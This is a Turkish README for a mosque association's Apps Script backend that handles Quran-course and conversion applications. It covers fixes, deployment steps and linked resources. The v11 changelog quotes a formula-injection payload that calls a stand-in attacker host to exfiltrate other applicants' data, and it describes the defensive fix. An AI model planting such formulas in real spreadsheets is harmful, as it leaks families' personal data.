# Apps Script arka ucu (kayıt + ihtida)

Kur'an kursu kayıt formu ile ihtida başvurusunun **arka ucu**. Tek bir Apps Script projesi
her iki formu da karşılar: veriyi başvuru defterine (Sheets) yazar, PDF ve görselleri
Drive'a koyar, bildirim e-postası gönderir ve yönetim paneline liste/belge uçları sunar.

> **Bu klasör neden var:** kod 25 Ağustos 2026'ya kadar yalnız `D:\tmp\gas\` altında
> duruyordu — geçici bir klasörde, sürüm takibi olmadan. Canlı başvuru sisteminin tek
> kaynağı böyle bir yerde durmamalı. Artık depoda; `D:\tmp\gas\` yalnız dağıtım betiklerinin
> çalışma alanı.

## Dosyalar

| Dosya | Durum |
|---|---|
| `ulucamii-Kod-v11.gs` | **Canlıda** — 26 Ağustos 2026'da dağıtıldı (Sheets formül koruması) |
| `ulucamii-Kod-v10.gs` | Önceki sürüm |
| `ulucamii-Kod-v9.gs` | Karşılaştırma için duruyor |

### v11 — defter hücreleri formüle dönüşemez (26 Ağustos 2026)

Google Sheets `=`, `+`, `-` veya `@` ile başlayan bir metni **formül** sayar. Başvurandan
gelen bir alan (veli adı, adres, sağlık notu) böylece defterde çalışabiliyordu:
`=IMPORTXML("http://saldirgan/?"&A2;"//a")` gibi bir girdi, defterdeki **diğer ailelerin
verisini dışarı sızdırabilirdi**. Panelin CSV çıktısında bu koruma zaten vardı; defterin
kendisinde yoktu (26 Ağustos güvenlik incelemesi bulgusu).

`hucreGuvenli()` riskli başlangıçlara zararsız bir tek tırnak öneki koyar (Sheets arayüzünde
görünmez, okunan değere dâhil değildir). `satirEkle()` defterle konuşan tek yerdir: her satır
yazılmadan önce hücre hücre geçer. Tarih nesneleri dokunulmadan geçer — zaman damgası bozulmaz.

**Yan fayda:** `+32…` telefon numaraları artık sayıya çevrilmiyor, artı işareti korunuyor.

Uçtan uca doğrulandı: `=1+1`, `=IMPORTXML(…)` ve `+42` içeren bir test kaydı gönderildi,
defterde **metin olarak** kaldıkları görüldü, ardından kayıt ve PDF'i silindi.

> **Anahtarlar bu dosyalarda YOKTUR.** Depo public olduğu için panel API anahtarı koddan
> çıkarıldı; yerinde `SCRIPT-PROPERTIES-ICINDE` yer tutucusu durur. Gerçek değer Apps
> Script'in **komut dosyası özelliklerinde** (`PANEL_ANAHTARI`). Doğrulandı: yer tutucu
> dizeyle yapılan istek `yetkisiz` döner, gerçek anahtarla çalışır.

## v10'daki düzeltmeler (25 Ağustos 2026 denetimi)

Dördü de dünkü çok ajanlı hata avında doğrulanmış bulgulardır; ayrıntı ve gerekçe için
`D:\app\marche-cami-sitesi\dokumanlar\16_HATA_AVI_25AGU2026.md`.

1. **Panel API anahtarı Script Properties'ten okunuyor** (bulgu 1). Kaynak kodda düz metin
   duruyordu. `PANEL_ANAHTARI` özelliği eklendi ve koddaki gerçek değer yer tutucuyla
   değiştirildi — **tamamlandı**. Proje zaten bu mekanizmayı kullanıyordu (`TABLO_ID`,
   `KLASOR_ID`, `IHTIDA_TABLO_ID`, `IHTIDA_KLASOR_ID`).
2. **Görsel okunamadığında sebebi kayda geçiyor** (bulgu 4). 4 MB üstü ya da bozuk bir
   görsel sessizce boş dönüyordu; artık `console.error` ile loglanıyor ve panele
   `okunamayanGorseller` alanıyla bildiriliyor.
3. **Drive'a yazılamayan belge iz bırakıyor** (bulgu 5). Şahit imzası, vesikalık veya
   başvuran imzası kaydedilemezse bildirim e-postasının sonuna "DİKKAT: şu belgeler
   kaydedilemedi" notu ekleniyor. Eskiden yalnız konsola düşüyordu; eksiklik ancak EK-9
   üretilirken fark ediliyordu.
4. **Eski satırı işaretleme hatası kaydı düşürmüyor** (bulgu 17). Bilgi güncellemesinde
   kayıt zaten yazıldıktan sonra eski satır işaretlenir; bu ikincil iş başarısız olunca
   başvurana `sunucu-hatasi` dönüyor ve tekrar göndermeye çalışıyordu. Artık kendi
   `try/catch`'inde.

## Dağıtım

Apps Script'in web editörü üzerinden yapılır (dernek Google hesabı `ulucamii2026@gmail.com`,
tarayıcı oturumu gerekir). Kanıtlanmış akış `D:\tmp\gas\dagit_v8b.py` içindedir:

1. Proje: `script.google.com/…/1lqu1c3HvcLKiTgKR_JJUsId0AcH1SQRfUI6OFEGFYiVeVcfaT4Sa0NAG/edit`
2. Editöre yaz: `monaco.editor.getModels()[0].setValue(kod)` → `Ctrl+S`
3. **Dağıt → Dağıtımları yönet → kalem (Düzenle) → Yeni sürüm → Dağıt**
   — "Yeni dağıtım" DEĞİL: yeni dağıtım yeni bir `/exec` adresi üretir ve site eski adrese
   bağlı kaldığı için başvurular sessizce eski sürüme gitmeye devam eder.
4. Doğrula: `/exec` → `{"ok":true,"servis":"ulucamii-alici"}`;
   `?islem=liste&anahtar=<UCP-…>` başlıkları dönmeli, yanlış anahtar `yetkisiz` demeli.

**Dağıtımdan sonra:** panelden bir EK-9 üretip belgenin eksiksiz geldiğini ve gerçek bir
gönderimin deftere düştüğünü doğrulayın. Test kaydı bırakırsanız **tek tek, ad filtresiyle**
silin — Drive'da toplu silme yasaktır (24 Ağustos'ta başvuru defteri bu yüzden çöpe gitti).

## Bağlı kaynaklar

| | |
|---|---|
| `/exec` | `https://script.google.com/macros/s/AKfycbz2cgLbdHmx9ejuk4euzybGbpDro0UAEjzjwl86tMdRtz05Pp5WI1JUZT374y_lb4J8BQ/exec` |
| Başvuru defteri | Sheets `1hYAhwkiKxDCbc-aFDrCP95PMNMSs2DLwM8TniKGptp0` |
| Siteden bağlantı | `src/content/ayarlar/site.yaml → servisler.basvuru` |
| Bildirim | `ulucamii.marche@gmail.com`, `info@ulucamii.be` |

## v18 (3 Eylül 2026 gece) — Sağlık ve izinler bölümü

- `goruntuSosyalIzni` (boolean, eksikse false): görüntü izni mecra başına ayrıldı (site/duyurular ↔ sosyal
  medya; APD «Images d'activités scolaires»). Defterde yeni sütun **sona** eklendi («Sosyal medya izni»),
  eski satırlar kaymaz. PDF'te ayrı satır; etiketler formdaki özetle aynı («Sağlık notu», «Görüntü izni (…)»).
- PDF sağlık başlığı üç dilli (EN dalı eklendi). **Drive'daki arşiv PDF'i sağlık notunu taşımaz**
  (`meta.saglikGizle`); veliye e-postayla giden kopya tam metni taşır.
- Yeni uç `?islem=saglik-temizle&anahtar=…&oncesi=YYYY-MM-DD`: verilen tarihten önceki kayıtların sağlık
  notunu defterden siler, rıza hücresine «silindi gg.aa.yyyy» yazar. **Her Temmuz bir kez çağrılır**
  (gizlilik bildirimi: not yalnız ilgili ders yılı boyunca tutulur).
